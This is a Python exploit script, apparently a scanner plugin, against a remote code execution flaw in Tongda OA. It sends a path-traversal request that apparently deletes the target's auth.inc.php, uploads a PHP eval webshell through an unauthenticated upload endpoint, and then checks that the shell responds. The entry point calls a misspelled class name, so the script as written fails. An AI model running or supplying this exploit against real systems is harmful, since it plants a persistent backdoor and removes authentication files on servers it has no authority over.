import requests
from termcolor import cprint

class tongda_rce_BaseVerify():
    def __init__(self,target):
        self.target=target

    def run(self):
        try:
            payload = "<?php eval($_POST['3838']);?>"
            url=self.target+"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
            requests.get(url=url)
            url=self.target+"/inc/auth.inc.php"
            page=requests.get(url=url).text
            if 'No input file specified.' not in page:
                int('a')
            url=self.target+"/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.<>./.<>./.<>./"
            files = {'FILE1': ('dadada.php', payload)}
            requests.post(url=url,files=files)
            url=self.target+"/_dadada.php"
            page=requests.get(url=url).text
            if 'No input file specified.' not in page:
                cprint("[+]存在通达OA-RCE漏洞...(信息)\t","green")
                cprint("[+]URL:",url)
                return True
            else:
                cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
        except:
            cprint("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

if __name__ == '__main__':
    tongda = tongda_RCE_BaseVerify('')
    tongda.run()